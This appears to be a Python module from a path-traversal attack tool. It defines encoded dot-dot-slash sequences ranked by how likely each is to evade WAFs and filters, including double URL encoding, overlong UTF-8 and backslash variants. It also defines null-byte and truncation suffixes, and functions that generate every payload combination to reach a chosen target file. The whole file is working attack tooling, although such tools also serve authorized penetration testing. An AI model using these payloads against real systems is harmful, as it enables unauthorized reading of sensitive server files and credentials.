"""Traversal encoding and bypass techniques."""

from __future__ import annotations

# Each entry: (name, dot-dot-slash variant)
# Ordered roughly by likelihood of bypassing common WAFs/filters.
TRAVERSAL_SEQUENCES: list[tuple[str, str]] = [
    ("plain", "../"),
    ("url-encoded", "..%2f"),
    ("url-encoded-full", "%2e%2e%2f"),
    ("double-url", "..%252f"),
    ("double-url-full", "%252e%252e%252f"),
    ("backslash", "..\\"),
    ("url-backslash", "..%5c"),
    ("dot-overlong-utf8", "..%c0%af"),
    ("dot-overlong-utf8-2", "%c0%ae%c0%ae%c0%af"),
    ("dot-overlong-utf8-3", "..%ef%bc%8f"),
    ("mixed-slash", "..\\/"),
    ("double-dot-variation", "....//"),
    ("triple-dot", ".../.../"),
    ("null-byte-suffix", "../%00"),
    ("url-encoded-backslash-full", "%2e%2e%5c"),
    ("utf8-dot", "\u2025/"),  # two-dot leader
]

# Common null byte / extension bypass suffixes
BYPASS_SUFFIXES: list[tuple[str, str]] = [
    ("none", ""),
    ("null-byte", "%00"),
    ("null-ext-php", "%00.php"),
    ("null-ext-html", "%00.html"),
    ("null-ext-jpg", "%00.jpg"),
    ("truncation", "A" * 4096),
]


def generate_traversals(depth: int, sequence: str) -> list[str]:
    """Generate traversal strings at depths 1..depth using the given sequence."""
    results = []
    current = ""
    for _ in range(depth):
        current += sequence
        results.append(current)
    return results


def build_payloads(
    target_file: str,
    max_depth: int = 10,
    encoding_names: list[str] | None = None,
    use_bypass_suffixes: bool = False,
) -> list[dict[str, str]]:
    """Build all payload combinations.

    Returns a list of dicts with keys: payload, encoding, depth, suffix.
    """
    encodings = TRAVERSAL_SEQUENCES
    if encoding_names:
        name_set = set(encoding_names)
        encodings = [(n, s) for n, s in TRAVERSAL_SEQUENCES if n in name_set]
        if not encodings:
            raise ValueError(
                f"No matching encodings. Available: {[n for n, _ in TRAVERSAL_SEQUENCES]}"
            )

    suffixes = BYPASS_SUFFIXES if use_bypass_suffixes else [("none", "")]

    payloads = []
    for enc_name, sequence in encodings:
        traversals = generate_traversals(max_depth, sequence)
        for depth_idx, traversal in enumerate(traversals, 1):
            for sfx_name, suffix in suffixes:
                payload = f"{traversal}{target_file}{suffix}"
                payloads.append(
                    {
                        "payload": payload,
                        "encoding": enc_name,
                        "depth": depth_idx,
                        "suffix": sfx_name,
                    }
                )
    return payloads


def list_encodings() -> list[tuple[str, str]]:
    """Return available encoding names and their sequences."""
    return TRAVERSAL_SEQUENCES
